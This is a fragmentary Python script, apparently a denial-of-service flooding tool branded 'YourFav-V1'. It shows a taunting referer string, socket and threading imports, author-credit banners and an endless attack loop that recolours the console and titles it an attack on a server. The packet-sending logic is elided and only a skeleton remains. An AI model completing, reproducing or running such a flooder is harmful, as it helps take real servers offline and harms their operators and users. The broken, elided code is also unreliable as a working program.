...
referers = ['Your_Server_Got_DDoS_By_YourFav-V1!!']
import random
import socket
import threading
import time
...
print("------------------------------------------------")
print("[+] Tools Used By : YourFav")
print("[+] Credit Tools : YourFav")
print("[+]Tools DDoS By : YourFav")
print("------------------------------------------------")
...
def run():
    ...
    while True:
        ...
        try:
            ...
            s.close()
            os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title YourFav-V1 Attack - Server")
            print("[!]Tools By YourFav-V1[!]")
            os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title YourFav-V1 Attack - Server")
